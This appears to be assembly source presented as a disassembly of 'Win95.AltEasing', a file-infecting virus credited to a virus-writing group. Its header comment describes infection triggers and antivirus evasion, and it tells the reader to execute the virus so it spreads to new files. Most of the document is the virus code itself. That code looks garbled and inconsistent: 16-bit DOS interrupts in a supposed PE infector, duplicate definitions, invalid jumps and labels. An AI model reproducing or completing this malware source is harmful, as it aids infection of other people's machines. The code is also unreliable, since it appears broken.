comment *
                            Win95.AltEasing
                             Disassembly by
                          Darkman/29A Security Group

  Win95.AltEasing is a resident, memory based parasitic non-encrypted PE 
  infector of Windows 95 executables. It doesn't infect system files like
  WS*32.EXE, set EXE marker to be infected only once per runlevel, hook
  Int08h (timer) and Int9h (keyboard), infect on close/open/rename/exec
  file operations and uses memory transfert to avoid virus detection.
  
  When an infected file is executed the virus code isn't mapped into memory
  but it's copied in a hole space between the host .EXE header and its first
  section. This way the virus isn't detected by many AVs because the infected
  file looks like a clean one: MZxxxxyyyyy..., where xxxxxx... are the original
  EXE data while yyyy... are the virus internal data.
  
  The virus doesn't use any encryption technique so it's easy to disassemble,
  optimize and emulate. Its main routines don't depend from virus constants
  as CRC32, checksums or others so this work isn't very hard although some
  routines need a lot of work.
  
  After closing a file the virus does not return control to the host but it
  starts infection process. The virus checks if the target file is a PE file
  (MZ signature), has no existing infection mark (check_sum field value),
  if it's a valid executable image and finally infects it. If infection fails
  for any reason the virus calls an error handler which may crash the computer
  :-)

  To emulate the virus you have to copy the host and the virus part of the
  infected file, join them, rename the resulting file to something like
  VIRCLED.EXE and try to execute it. The host will start and after it finishes
  its job the virus will infect the new file with the same name. Repeat this
  procedure several times until the infected file looks like a clean one.
*

.286p

VirSize       =       offset VirEnd-offset Virus           ; Virus size
VirusSize     =       1472                                  ; Virus size in bytes
CheckSum      equ       ((offset VirEnd-offset Virus)/16)+3  ; Fake check sum

                Org 0h

ExeHdr:         Signature       db      'MZ'                    ; Exe Mz signature
                LastPage      dw      4                       ; Last page
                NumReloc      dw      3                       ; Number of reloc
                HeaderSize    dw      20                      ; Size of hdr
                MinMemSize    dw      16384                   ; Initial Memory size
                MaxMemSize    dw      16384                   ; Maximum Memory size
                ExeSS         dw      2                       ; Initial SS:SP
                ExeSP         dw      0C000h
                CheckSum      dd      0                       ; Checksum
                ExeIP         dw      1000h                   ; Starting entry point
                ExeSSCRC      dw      0                       ; Initial SS checksum
                ExeEnv        dd      0                       ; Current Environment address
                ExeAddr       dd      1000h                   ; Spawning FSD segment
                ExeFilePage   dd      400h                    ; Starting page
                ExeModule     dd      0                       ; File Name of module being loaded
                ExeInitStack  dw      0                       ; Byte offset of initializing proc
                ExeInitStackCRC       dw      0               ; Initial stack checksum
                ExeUnused0    dd      0                       ;
                ExeUnused1    dd      0                       ;
                ExeUnused2    dd      0                       ;
                ExeUnused3    dd      0                       ;

HostBuff:                                                           ; Host exe data
OldCS         dw      ?                                         ; Original CS
OldIP         dw      ?
OldSS         dw      ?
OldSP         dw      ?
OldChecksum   dd      ?
OldEntry      dd      ?

Virus:                                                                     ; Virus code
                cld
                call    SetupFPU                              ; No action with fpu!
                lea     esi,[bp+OldExe]                       ; Offset of old exe data
                mov     di,offset HostBuff                    ; Host buffer
                push    di                                    ; Save di and bp for return
                push    bp
                movsw                                           ; Copy old exe data
                movsw
                pop     bp                                      ; Return to here
                pop     di
                mov     ax,es                                   ; Get mcb block
                dec     ax
                mov     es,ax                                   ; Es point to mcb block
                mov     bx,es:[03h]                             ; Bx point to next mcb
                mov     ah,4Ah                                ; Shrink current block
                mov     dx,VirusSize-VirSize+100h              ; Total byte to shrink
                int     21h                                     ;
                jnc     @f
                jmp     RetHost                               ; Exit if error
@db           mov     es,bx                                   ; Es point to next mcb
                mov     ah,48h                                ; Allocate memory
                mov     dx,(MemorySize/VirSize)*VirusSize      ; Total byte to allocate
                int     21h
                jc      RetHost                               ; Exit if error
                sub     bx,0Bh                                 ; Adjust allocated seg
                                                                                                ; address to get allocated memory base
                push    cs                                          ; Cs=Ds=Es
                pop     ds
                pop     es
                xor     si,si                                   ; Zero si
                push    si                                          ; Save for later use
                call    MemRelo                                   ; Relocate virus in memory
                pop     si
                push    es                                            ; Es=Ds=Psp
                pop     ds
                mov     ax,ds
                mov     es,ax
                mov     bx,es:[2ch]                                 ; Bx point to environment
                mov     [si],bx                                               ; Save environment address
                lds     dx,dword ptr [bp+OldExe+18h]                ; Old env pointer
                mov     cx,1Ch                                      ; Environment length
                cld                                                   ; Clear direction flag
                repne                                           ; Repeat until equal
                lodsb                                                 ; Load the environment char
                scasb                                                 ; Check if already installed
                jnz     @f                                              ; No more environment variables
                jmp     RetHost                                                                             ; Exit if error
@db           dec     dx                                                      ; Adjust pointer position
                                                                                                ; Environment variable found
                lodsw                                                     ; Load two chars
                cmp     ax,'=:'                                       ; Is end of environment var?
                jz      SetSegs                                             ; Yes! Go on
                sub     dx,dx                                               ; Zero dx
                mov     al,byte ptr [si-6]                        ; Get '=' position
                add     dx,ax                                                       ; Calculate next var offset
                jmp     short dx                                          ; Jmp to next var
SetSegs:                                            ; Set PSP segments
                xor     ax,ax
                mov     ds,ax                                               ; Reset ds
                mov     ss,ax                                               ; And ss
                mov     sp,7C00h                                        ; Sp point to virus code
                push    ds                                                        ; Save all registers
                push    es
                push    cs
                push    cs
                push    cs
                push    cs
                mov     ax,offset VirusEntryPoint                     ; Virus entry point
                push    ax
                pushf                                                         ; Pushf/popf trick to force iret
                popf
                push    cs
                popf
                jmp     dword ptr cs:[VirEntryPoint-offset Virus]         ; Jump to virus code

RetHost:                                                            ; Return to host
                mov     di,offset HostBuff                                          ; Point to host buffer
                mov     word ptr es:[di+2],cs                                         ; Restore old cs
                mov     es:[di],word ptr cs:[di+2]                           ; And sp
                push    cs                                                          ; Equalize regs
                pop     ds
                push    cs
                pop     es
                push    cs
                pop     ss
                mov     ax,es                                                                           ; Es point to PSP
                add     ax,10h                                                ; Add psp size
                add     [di+6],ax                                             ; Restore old ss
                add     ax,[di+4]                                             ; Add old sp
                add     ax,4                                                  ; And account for pushf
                cli                                                             ; Disable interrupts
                mov     sp,ax                                               ; Restore old sp
                sti                                                             ; Enable interrupts
                db      1ah                                                   ; Iret will pop cs and ip
Iret:

VirusEntryPoint         db      0eah                                    ; Virus entry point
OldExe:                                                                   ; Old exe data
                push    es                                                        ; Save all registers
                push    ds
                push    ss
                push    cs
                push    cs
                push    cs
                push    cs
                mov     ax,offset RetHost                                       ; Save entry point
                xchg    ax,word ptr ds:[100h]
                push    ds                                                        ; Psp segment
                mov     ds,ax                                                   ; Ds point to virus code
